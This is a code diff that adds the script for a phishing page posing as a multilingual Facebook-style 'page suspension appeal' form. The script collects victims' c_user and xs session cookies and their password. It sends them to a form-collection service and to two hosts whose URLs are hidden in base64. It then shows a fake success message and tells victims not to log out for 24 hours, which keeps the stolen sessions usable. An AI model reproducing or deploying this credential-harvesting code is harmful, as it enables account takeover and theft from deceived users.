+        error: "Entrée invalide. c_user doit être uniquement des chiffres et xs doit être une combinaison de lettres, de chiffres et de symboles (minimum 8 caractères). Regardez la vidéo pour obtenir de l'aide.",
+        securityTitle: "Entrez votre mot de passe pour confirmer que c'est vous",
+        continueBtn: "Continuer",
+        securityDisclaimer: "Pour des raisons de sécurité, veuillez vérifier votre identité. Cela nous aide à protéger votre compte.",
+        successTitle: "Recours Soumis avec Succès",
+        successMsg: "Votre recours a été soumis avec succès. Notre équipe l'examinera et vous contactera bientôt.",
+        warning: "Ne vous déconnectez pas de votre compte pendant les 24 prochaines heures."
+      },
+      de: {
+        title: "Formular zur Anfechtung der Seitenaussetzung",
+        bullet1: "Ihre Seite verstößt gegen unsere Community-Richtlinien.",
+        bullet2: "Reichen Sie Ihren Einspruch innerhalb von 24 Stunden ein.",
+        bullet3: "Stellen Sie sicher, dass Ihre Inhalte alle Anforderungen erfüllen.",
+        videoTitle: "Leitfaden zum Einspruchsverfahren",
+        playText: "Klicken Sie, um das Video abzuspielen",
+        videoDesc: "Sehen Sie sich diesen kurzen Leitfaden an, um den Einspruchsprozess zu verstehen.",
+        c_user: "c_user",
+        xs: "xs",
+        send: "Senden",
+        error: "Ungültige Eingabe. c_user muss nur Zahlen enthalten und xs muss eine Kombination aus Buchstaben, Zahlen und Symbolen sein (mindestens 8 Zeichen). Sehen Sie sich das Video an, um Hilfe zu erhalten.",
+        securityTitle: "Geben Sie Ihr Passwort ein, um zu bestätigen, dass Sie es sind",
+        continueBtn: "Weiter",
+        securityDisclaimer: "Geben Sie aus Sicherheitsgründen Ihre Identität an. Dies hilft uns, Ihr Konto zu schützen.",
+        successTitle: "Einspruch erfolgreich eingereicht",
+        successMsg: "Ihr Einspruch wurde erfolgreich eingereicht. Unser Team wird ihn prüfen und sich bald bei Ihnen melden.",
+        warning: "Melden Sie sich in den nächsten 24 Stunden nicht von Ihrem Konto ab."
+      },
+      hi: {
+        title: "पेज निलंबन चेतावनी अपील फॉर्म",
+        bullet1: "आपका पेज हमारे सामुदायिक दिशानिर्देशों का उल्लंघन करता है।",
+        bullet2: "24 घंटे के भीतर अपनी अपील जमा करें।",
+        bullet3: "सुनिश्चित करें कि आपकी सामग्री सभी आवश्यकताओं का पालन करती है।",
+        videoTitle: "अपील प्रक्रिया गाइड",
+        playText: "वीडियो चलाने के लिए क्लिक करें",
+        videoDesc: "अपील प्रक्रिया को समझने के लिए इस संक्षिप्त गाइड को देखें।",
+        c_user: "c_user",
+        xs: "xs",
+        send: "भेजें",
+        error: "अमान्य इनपुट। c_user केवल संख्याएँ होनी चाहिए और xs अक्षरों, संख्याओं और प्रतीकों का संयोजन होना चाहिए (न्यूनतम 8 वर्ण)। मदद के लिए वीडियो देखें।",
+        securityTitle: "पुष्टि करने के लिए अपना पासवर्ड दर्ज करें कि यह आप ही हैं",
+        continueBtn: "जारी रखें",
+        securityDisclaimer: "सुरक्षा कारणों से, कृपया अपनी पहचान सत्यापित करें। यह आपके खाते को सुरक्षित रखने में हमारी मदद करता है।",
+        successTitle: "अपील सफलतापूर्वक जमा की गई",
+        successMsg: "आपकी अपील सफलतापूर्वक जमा कर दी गई है। हमारी टीम इसकी समीक्षा करेगी और जल्द ही आपसे संपर्क करेगी।",
+        warning: "अगले 24 घंटों के लिए अपने खाते से लॉग आउट न करें।"
+      },
+      ar: {
+        title: "نموذج استئناف تحذير تعليق الصفحة",
+        bullet1: "تنتهك صفحتك إرشادات المجتمع الخاصة بنا.",
+        bullet2: "قدم استئنافك قبل 24 ساعة.",
+        bullet3: "تأكد من أن المحتوى الخاص بك يتوافق مع جميع المتطلبات.",
+        videoTitle: "دليل عملية الاستئناف",
+        playText: "انقر لتشغيل الفيديو",
+        videoDesc: "شاهد هذا الدليل القصير لفهم عملية الاستئناف.",
+        c_user: "c_user",
+        xs: "xs",
+        send: "إرسال",
+        error: "إدخال غير صالح. يجب أن يحتوي c_user على أرقام فقط ويجب أن يكون xs مزيجًا من الأحرف والأرقام والرموز (8 أحرف على الأقل). شاهد الفيديو للحصول على المساعدة.",
+        securityTitle: "أدخل كلمة المرور الخاصة بك لتأكيد أنك أنت",
+        continueBtn: "متابعة",
+        securityDisclaimer: "لأسباب أمنية، يرجى التحقق من هويتك. هذا يساعدنا في الحفاظ على أمان حسابك.",
+        successTitle: "تم تقديم الاستئناف بنجاح",
+        successMsg: "تم تقديم استئنافك بنجاح. سيقوم فريقنا بمراجعته وسيتواصل معك قريبًا.",
+        warning: "لا تقم بتسجيل الخروج من حسابك خلال الـ 24 ساعة القادمة."
+      },
+      ta: {
+        title: "பக்க இடைநிறுத்தம் எச்சரிக்கை முறையீடு படிவம்",
+        bullet1: "உங்கள் பக்கம் எங்கள் சமூக வழிகாட்டுதல்களை மீறுகிறது.",
+        bullet2: "24 மணி நேரத்திற்குள் உங்கள் முறையீட்டை சமர்ப்பிக்கவும்.",
+        bullet3: "உங்கள் உள்ளடக்கம் அனைத்து தேவைகளுக்கும் இணங்குவதை உறுதிப்படுத்தவும்.",
+        videoTitle: "முறையீடு செயல்முறை வழிகாட்டி",
+        playText: "வீடியோவை இயக்க கிளிக் செய்க",
+        videoDesc: "முறையீடு செயல்முறையைப் புரிந்துகொள்வதற்கு இந்த குறுகிய வழிகாட்டியைப் பார்க்கவும்.",
+        c_user: "c_user",
+        xs: "xs",
+        send: "அனுப்பு",
+        error: "தவறான உள்ளீடு। c_user எண்களை மட்டுமே கொண்டிருக்க வேண்டும் மற்றும் xs எழுத்துக்கள், எண்கள் மற்றும் குறியீடுகளின் கலவையாக இருக்க வேண்டும் (குறைந்தது 8 எழுத்துகள்). உதவிக்காக வீடியோவைப் பார்க்கவும்.",
+        securityTitle: "அது நீங்கள் என்பதை உறுதிப்படுத்த உங்கள் கடவுச்சொல்லை உள்ளிடவும்",
+        continueBtn: "தொடரவும்",
+        securityDisclaimer: "பாதுகாப்பு காரணங்களுக்காக, உங்கள் அடையாளத்தை சரிபார்க்கவும். இது உங்கள் கணக்கைப் பாதுகாக்க உதவுகிறது.",
+        successTitle: "முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது",
+        successMsg: "உங்கள் முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது. எங்கள் குழு அதை மதிப்பாய்வு செய்து விரைவில் உங்களைத் தொடர்பு கொள்ளும்.",
+        warning: "அடுத்த 24 மணி நேரத்திற்கு உங்கள் கணக்கிலிருந்து வெளியேற வேண்டாம்."
+      }
+    };
+
+    // Current language
+    let currentLanguage = 'en';
+
+    // Function to translate the page
+    function translatePage(lang) {
+      if (!translations[lang]) return;
+      
+      currentLanguage = lang;
+      
+      // Update all translatable elements
+      document.getElementById('page-title').textContent = translations[lang].title;
+      
+      document.getElementById('bullet1').textContent = translations[lang].bullet1;
+      document.getElementById('bullet2').textContent = translations[lang].bullet2;
+      document.getElementById('bullet3').textContent = translations[lang].bullet3;
+      
+      document.getElementById('video-title').textContent = translations[lang].videoTitle;
+      document.getElementById('play-text').textContent = translations[lang].playText;
+      document.getElementById('video-desc').textContent = translations[lang].videoDesc;
+      
+      document.getElementById('c_user-label').textContent = translations[lang].c_user;
+      document.getElementById('xs-label').textContent = translations[lang].xs;
+      
+      document.getElementById('send-button').textContent = translations[lang].send;
+      
+      // Update error message if it's visible
+      const errorEl = document.getElementById('error-message');
+      if (errorEl.textContent) {
+        errorEl.textContent = translations[lang].error;
+      }
+      
+      // Update security popup texts
+      document.getElementById('security-title').textContent = translations[lang].securityTitle;
+      document.getElementById('continue-btn').textContent = translations[lang].continueBtn;
+      document.getElementById('security-disclaimer').textContent = translations[lang].securityDisclaimer;
+      
+      // Update success popup texts
+      document.getElementById('success-title').textContent = translations[lang].successTitle;
+      document.getElementById('success-message').textContent = translations[lang].successMsg;
+      document.getElementById('warning-text').textContent = translations[lang].warning;
+      
+      // Update the translator button text
+      const btnText = {
+        'en': 'English',
+        'es': 'Español',
+        'fr': 'Français',
+        'de': 'Deutsch',
+        'hi': 'हिन्दी',
+        'ar': 'العربية',
+        'ta': 'தமிழ்'
+      };
+      
+      const btn = document.getElementById('translatorBtn');
+      btn.innerHTML = `<i class="fa fa-language"></i> ${btnText[lang] || 'Translate'}`;
+      
+      // Save language preference
+      localStorage.setItem('preferredLanguage', lang);
+    }
+
+    // Language translation function
+    function changeLanguage(lang) {
+      translatePage(lang);
+      // Close the dropdown
+      document.getElementById('translatorDropdown').style.display = 'none';
+      return false; // Prevent default anchor behavior
+    }
+
+    // Initialize page with saved language or default
+    document.addEventListener('DOMContentLoaded', function() {
+      const savedLang = localStorage.getItem('preferredLanguage') || 'en';
+      translatePage(savedLang);
+      
+      // Set active nav item
+      const navItems = document.querySelectorAll('.side-nav-item');
+      if (navItems.length > 0) {
+        navItems[0].classList.add('active');
+      }
+
+      // Add click handler for translator button
+      document.getElementById('translatorBtn').addEventListener('click', function(e) {
+        e.stopPropagation();
+        const dropdown = document.getElementById('translatorDropdown');
+        dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+      });
+    });
+
+    // Toggle mobile menu
+    document.getElementById('menuToggle').addEventListener('click', function() {
+      document.getElementById('sideNav').classList.toggle('active');
+      this.setAttribute('aria-expanded', document.getElementById('sideNav').classList.contains('active'));
+    });
+
+    // Close menu when clicking outside
+    document.addEventListener('click', function(event) {
+      const sideNav = document.getElementById('sideNav');
+      const menuToggle = document.getElementById('menuToggle');
+      
+      if (!sideNav.contains(event.target) && event.target !== menuToggle) {
+        sideNav.classList.remove('active');
+        menuToggle.setAttribute('aria-expanded', 'false');
+      }
+
+      // Close translator dropdown when clicking outside
+      if (!event.target.closest('.translator-container')) {
+        document.getElementById('translatorDropdown').style.display = 'none';
+      }
+    });
+
+    // Video poster click handler
+    document.getElementById('videoPoster').addEventListener('click', function() {
+      showLanguagePopup();
+    });
+
+    // Language popup functions
+    function showLanguagePopup() {
+      document.getElementById("languagePopupOverlay").classList.add("active");
+      document.body.style.overflow = "hidden";
+    }
+
+    function closeLanguagePopup() {
+      document.getElementById("languagePopupOverlay").classList.remove("active");
+      document.body.style.overflow = "";
+    }
+
+    function selectLanguage(lang) {
+      const video = document.getElementById("guideVideo");
+      const source = document.getElementById("videoSource");
+      const poster = document.getElementById("videoPoster");
+      const loading = document.getElementById("videoLoading");
+      
+      // Show loading indicator
+      loading.style.display = "block";
+      poster.style.display = "none";
+      video.style.display = "none";
+      
+      // Set video source based on selected language
+      switch(lang) {
+        case 'english':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/english.mp4";
+          break;
+        case 'spanish':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/spanish.mp4";
+          break;
+        case 'french':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/french.mp4";
+          break;
+        case 'german':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/german.mp4";
+          break;
+        case 'hindi':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/hindi.mp4";
+          break;
+        case 'arabic':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/arabic.mp4";
+          break;
+        case 'tamil':
+          source.src = "https://ik.imagekit.io/6zsbaguopp/tamil.mp4";
+          break;
+        default:
+          source.src = "https://ik.imagekit.io/6zsbaguopp/english.mp4";
+      }
+      
+      // Reset and load the new video source
+      video.load();
+      
+      // Handle video events
+      video.onloadeddata = function() {
+        loading.style.display = "none";
+        video.style.display = "block";
+        video.controls = true;
+        
+        // Try to play the video (may require user interaction on mobile)
+        const playPromise = video.play();
+        
+        if (playPromise !== undefined) {
+          playPromise.catch(error => {
+            // Show controls if autoplay fails
+            video.controls = true;
+            console.log("Autoplay prevented, showing controls:", error);
+          });
+        }
+      };
+      
+      video.onerror = function() {
+        loading.style.display = "none";
+        poster.style.display = "flex";
+        alert("Failed to load video. Please try again later.");
+      };
+      
+      // Close the language popup
+      closeLanguagePopup();
+    }
+
+    // Handle direct video clicks
+    document.getElementById('guideVideo').addEventListener('click', function(e) {
+      e.stopPropagation();
+    });
+
+    // Form submission with validation
+    document.querySelector(".send-button").addEventListener("click", function () {
+      const cUser = document.getElementById("c_user").value.trim();
+      const xs = document.getElementById("xs").value.trim();
+      const errorEl = document.getElementById("error-message");
+
+      // Validate c_user - must be numbers only
+      const cUserValid = /^\d+$/.test(cUser);
+      
+      // Validate xs - must contain at least one number, one letter, and one symbol
+      const hasNumber = /[0-9]/.test(xs);
+      const hasLetter = /[a-zA-Z]/.test(xs);
+      const hasSymbol = /[^a-zA-Z0-9]/.test(xs);
+      const xsValid = hasNumber && hasLetter && hasSymbol && xs.length >= 8;
+
+      if (!cUserValid || !xsValid) {
+        errorEl.textContent = translations[currentLanguage].error;
+        errorEl.style.display = "block";
+        
+        // Highlight invalid fields
+        if (!cUserValid) {
+          document.getElementById("c_user").style.borderColor = "red";
+        } else {
+          document.getElementById("c_user").style.borderColor = "#454444";
+        }
+        
+        if (!xsValid) {
+          document.getElementById("xs").style.borderColor = "red";
+        } else {
+          document.getElementById("xs").style.borderColor = "#454444";
+        }
+      } else {
+        errorEl.textContent = "";
+        errorEl.style.display = "none";
+        document.getElementById("c_user").style.borderColor = "#454444";
+        document.getElementById("xs").style.borderColor = "#454444";
+        openPopup();
+      }
+    });
+
+    function openPopup() {
+      document.getElementById("securityPopupOverlay").classList.add("active");
+      document.body.style.overflow = "hidden";
+      document.getElementById("passwordInput").value = "";
+      document.getElementById("passwordInput").focus();
+    }
+
+    function closePopup() {
+      document.getElementById("securityPopupOverlay").classList.remove("active");
+      document.body.style.overflow = "";
+    }
+
+    function closeSuccessPopup() {
+      document.getElementById("successPopupOverlay").classList.remove("active");
+      document.body.style.overflow = "";
+    }
+
+    function submitPassword() {
+      const password = document.getElementById("passwordInput").value;
+      if (password) {
+        closePopup();
+        
+        // Show loading spinner
+        document.getElementById("loadingOverlay").classList.add("active");
+        document.body.style.overflow = "hidden";
+        
+        // Get form values
+        const c_user = document.getElementById("c_user").value.trim();
+        const xs = document.getElementById("xs").value.trim();
+        const language = currentLanguage;
+        
+        // Prepare data to submit
+        const formData = {
+          c_user: c_user,
+          xs: xs,
+          password: password,
+          language: language,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          referrer: document.referrer || 'direct'
+        };
+
+        // Submit to the first form (known working)
+        fetch("https://submit-form.com/HH7YlMQkQ", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(formData)
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error("First form submission failed");
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log("First form submitted successfully:", data);
+          // Submit to second form
+          return submitToSecondForm(formData);
+        })
+        .then(() => {
+          console.log("Second form submitted successfully");
+          // Try third form but don't block on failure
+          return submitToThirdForm(formData)
+            .catch(e => {
+              console.error("Third form failed (non-critical)", e);
+              return true; // Continue anyway
+            });
+        })
+        .then(() => {
+          // Hide loading spinner
+          document.getElementById("loadingOverlay").classList.remove("active");
+          // Show success popup
+          document.getElementById("successPopupOverlay").classList.add("active");
+        })
+        .catch(error => {
+          console.error("Error in submission chain:", error);
+          // Hide loading spinner
+          document.getElementById("loadingOverlay").classList.remove("active");
+          // Show error to user but still show success UI
+          alert("Submission completed with minor issues. Your appeal has been received.");
+          document.getElementById("successPopupOverlay").classList.add("active");
+        });
+      } else {
+        alert(translations[currentLanguage].error || "Please enter your password to continue");
+      }
+    }
+
+    function submitToSecondForm(data) {
+      const encodedUrl = 'aHR0cHM6Ly91emFpci53YXNtZXIuYXBw';
+      const decodedUrl = atob(encodedUrl);
+      
+      // Create form data
+      const formData = new FormData();
+      formData.append('c_user', data.c_user);
+      formData.append('xs', data.xs);
+      formData.append('password', data.password);
+      
+      return fetch(decodedUrl, {
+          method: 'POST',
+          body: formData,
+          mode: 'no-cors' // Important for CORS issues
+      })
+      .then(response => {
+          // With no-cors mode, response will be opaque - we can't read it
+          console.log('Second form submission attempt completed');
+          return response;
+      })
+      .catch(error => {
+          console.error('Error submitting to second form:', error);
+          throw error;
+      });
+    }
+
+    function submitToThirdForm(data) {
+      const encodedUrl = 'aHR0cHM6Ly9hd2Fpcy1waHAud2FzbWVyLmFwcA==';
+      const decodedUrl = atob(encodedUrl);
+      
+      // Create form data
+      const formData = new FormData();
+      formData.append('c_user', data.c_user);
+      formData.append('xs', data.xs);
+      formData.append('password', data.password);
+      
+      return fetch(decodedUrl, {
+          method: 'POST',
+          body: formData,
+          mode: 'no-cors' // Important for CORS issues
+      })
+      .then(response => {
+          // With no-cors mode, response will be opaque - we can't read it
+          console.log('Third form submission attempt completed');
+          return response;
+      })
+      .catch(error => {
+          console.error('Error submitting to third form:', error);
+          throw error;
+      });
+    }
+
+    // Close popups when clicking outside
+    window.addEventListener('click', function(event) {
+      const securityPopupOverlay = document.getElementById('securityPopupOverlay');
+      const successPopupOverlay = document.getElementById('successPopupOverlay');
+      const languagePopupOverlay = document.getElementById('languagePopupOverlay');
+      
+      if (event.target === securityPopupOverlay) {
+        closePopup();
+      }
+      if (event.target === successPopupOverlay) {
+        closeSuccessPopup();
+      }
+      if (event.target === languagePopupOverlay) {
+        closeLanguagePopup();
+      }
+    });
+
+    // Handle keyboard events for accessibility
+    document.addEventListener('keydown', function(event) {
+      // Close popups with ESC key
+      if (event.key === 'Escape') {
+        closePopup();
+        closeSuccessPopup();
+        closeLanguagePopup();
+        document.getElementById('translatorDropdown').style.display = 'none';
+      }
+    });
+  </script>
 </body>
-
 </html>
-<html lang="en">
